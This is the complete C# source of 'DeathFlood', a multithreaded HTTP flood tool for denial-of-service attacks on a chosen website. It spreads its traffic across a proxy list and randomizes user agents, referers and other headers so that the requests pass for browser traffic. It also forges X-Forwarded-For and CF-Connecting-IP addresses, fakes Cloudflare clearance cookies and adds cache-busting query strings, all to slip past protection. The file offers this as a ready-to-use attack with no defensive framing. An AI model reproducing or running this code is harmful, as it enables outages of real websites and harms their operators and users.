// DeathFlood.cs
// Compile: dotnet new console -n DeathFlood -f net8.0
// Replace Program.cs with this code, then `dotnet build -c Release`
// Usage: dotnet run -- <target> <time> <rate> <threads> <proxyfile>

using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class DeathFlood
{
    static readonly Random _rand = new Random();

    // ========== HEADER POOLS (shortened for brevity) ==========
    static readonly string[] _accepts = {
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
        "*/*", "image/*", "text/html"
    };
    static readonly string[] _langs = {
        "en-US,en;q=0.9", "fr-FR,fr;q=0.8,en;q=0.7", "de-DE,de;q=0.9",
        "zh-CN,zh;q=0.9", "ja-JP,ja;q=0.9", "ru-RU,ru;q=0.8"
    };
    static readonly string[] _encodings = {
        "gzip, deflate, br", "gzip", "deflate", "br", "identity"
    };
    static readonly string[] _controls = {
        "max-age=604800", "no-cache", "max-age=0", "private", "public"
    };
    static readonly string[] _referers = {
        "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
        "https://check-host.net/", "https://github.com/"
    };
    static readonly string[] _userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    };
    static readonly string[] _secChUa = {
        "\"Chromium\";v=\"120\", \"Not)A;Brand\";v=\"8\", \"Google Chrome\";v=\"120\"",
        "\"Chromium\";v=\"119\", \"Not)A;Brand\";v=\"8\", \"Google Chrome\";v=\"119\""
    };
    static readonly string[] _dest = { "document", "image", "embed", "empty" };
    static readonly string[] _mode = { "cors", "navigate", "no-cors", "same-origin" };
    static readonly string[] _site = { "cross-site", "same-origin", "same-site", "none" };
    static readonly string[] _xForwardedFor = {
        "192.168.1.1", "10.0.0.1", "172.16.0.1", "8.8.8.8", "1.1.1.1"
    };

    static string RandomElement(string[] arr) => arr[_rand.Next(arr.Length)];
    static string RandomString(int len) => Path.GetRandomFileName().Replace(".", "").Substring(0, len);

    static async Task Main(string[] args)
    {
        if (args.Length < 5)
        {
            Console.WriteLine("Usage: DeathFlood <target> <time> <rate> <threads> <proxyfile>");
            return;
        }

        string target = args[0];
        int durationSec = int.Parse(args[1]);
        int rate = int.Parse(args[2]);          // requests per second per thread
        int threads = int.Parse(args[3]);
        string proxyFile = args[4];

        // Load proxies
        string[] proxies = File.Exists(proxyFile)
            ? File.ReadAllLines(proxyFile)
                .Select(l => l.Trim())
                .Where(l => !string.IsNullOrEmpty(l) && !l.StartsWith('#'))
                .ToArray()
            : new string[0];

        if (proxies.Length == 0)
        {
            Console.WriteLine("[!] No proxies found. Using direct connections.");
            proxies = new string[] { null }; // direct mode
        }

        Console.Clear();
        Console.WriteLine("  Death 1.0  ".Red());
        Console.WriteLine("--------------------------------------------".Gray());
        Console.WriteLine($"Target: ".BrightYellow() + target);
        Console.WriteLine($"Time: ".BrightYellow() + durationSec);
        Console.WriteLine($"Rate: ".BrightYellow() + rate);
        Console.WriteLine($"Thread: ".BrightYellow() + threads);
        Console.WriteLine($"ProxyFile: ".BrightYellow() + proxyFile);
        Console.WriteLine("--------------------------------------------".Gray());
        Console.WriteLine($"Note: ".BrightCyan() + "Use high‑quality proxies for best results.");

        var cts = new CancellationTokenSource();
        var tasks = new Task[threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < threads; i++)
        {
            int tid = i;
            counters[tid] = 0;
            string proxy = proxies[tid % proxies.Length];
            tasks[tid] = Task.Run(() => FloodWorker(tid, target, durationSec, rate, proxy, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {kv.Value}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\nAttack finished.");
    }

    static async Task FloodWorker(int id, string targetUrl, int durationSec, int rate, string proxyStr, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };

        if (!string.IsNullOrEmpty(proxyStr))
        {
            var proxyParts = proxyStr.Split(':');
            if (proxyParts.Length == 2)
            {
                handler.Proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));
                handler.UseProxy = true;
            }
        }

        using var client = new HttpClient(handler);
        var uri = new Uri(targetUrl);
        string path = uri.PathAndQuery;
        if (string.IsNullOrEmpty(path)) path = "/";

        int intervalMs = 1000 / rate;
        var sw = Stopwatch.StartNew();

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < durationSec)
        {
            // Build random headers
            client.DefaultRequestHeaders.Clear();
            string userAgent = RandomElement(_userAgents);
            string accept = RandomElement(_accepts);
            string lang = RandomElement(_langs);
            string encoding = RandomElement(_encodings);
            string control = RandomElement(_controls);
            string referer = RandomElement(_referers);
            string xff = RandomElement(_xForwardedFor);
            string secChUa = RandomElement(_secChUa);
            string dest = RandomElement(_dest);
            string mode = RandomElement(_mode);
            string site = RandomElement(_site);
            string cookie = $"cf_clearance={RandomString(4)}.{RandomString(20)}.{RandomString(40)}-0.0.1";

            client.DefaultRequestHeaders.Add("User-Agent", userAgent);
            client.DefaultRequestHeaders.Add("Accept", accept);
            client.DefaultRequestHeaders.Add("Accept-Language", lang);
            client.DefaultRequestHeaders.Add("Accept-Encoding", encoding);
            client.DefaultRequestHeaders.Add("Cache-Control", control);
            client.DefaultRequestHeaders.Add("Referer", referer);
            client.DefaultRequestHeaders.Add("X-Forwarded-For", xff);
            client.DefaultRequestHeaders.Add("CF-Connecting-IP", xff);
            client.DefaultRequestHeaders.Add("Cookie", cookie);
            client.DefaultRequestHeaders.Add("Sec-Ch-Ua", secChUa);
            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Mobile", "?0");
            client.DefaultRequestHeaders.Add("Sec-Ch-Ua-Platform", "\"Windows\"");
            client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
            client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", dest);
            client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", mode);
            client.DefaultRequestHeaders.Add("Sec-Fetch-Site", site);
            client.DefaultRequestHeaders.Add("TE", "trailers");
            if (_rand.NextDouble() < 0.5)
                client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
            if (_rand.NextDouble() < 0.3)
                client.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");

            // Add random extra headers (like the Node version's rateHeaders)
            if (_rand.NextDouble() < 0.4)
                client.DefaultRequestHeaders.Add("A-IM", "Feed");
            if (_rand.NextDouble() < 0.3)
                client.DefaultRequestHeaders.Add("Forwarded", $"for={xff};proto=http");
            if (_rand.NextDouble() < 0.2)
                client.DefaultRequestHeaders.Add("Origin", uri.Scheme + "://" + uri.Host);

            // Build request URI with random cache buster
            string query = path.Contains('?') ? "&" : "?";
            string requestUri = targetUrl + query + "_=" + RandomString(8);

            try
            {
                using var response = await client.GetAsync(requestUri, HttpCompletionOption.ResponseHeadersRead, ct);
                // Immediately discard body to free resources
                await response.Content.ReadAsStreamAsync(ct).ContinueWith(t => t.Result?.Dispose());
                counter.AddOrUpdate(id, 1, (_, old) => old + 1);
            }
            catch
            {
                // Ignore errors
            }

            await Task.Delay(intervalMs, ct);
        }
    }
}

// Simple console color extensions
public static class ColorExtensions
{
    public static string Red(this string s) => $"\x1b[31m{s}\x1b[0m";
    public static string Gray(this string s) => $"\x1b[90m{s}\x1b[0m";
    public static string BrightYellow(this string s) => $"\x1b[93m{s}\x1b[0m";
    public static string BrightCyan(this string s) => $"\x1b[96m{s}\x1b[0m";
}
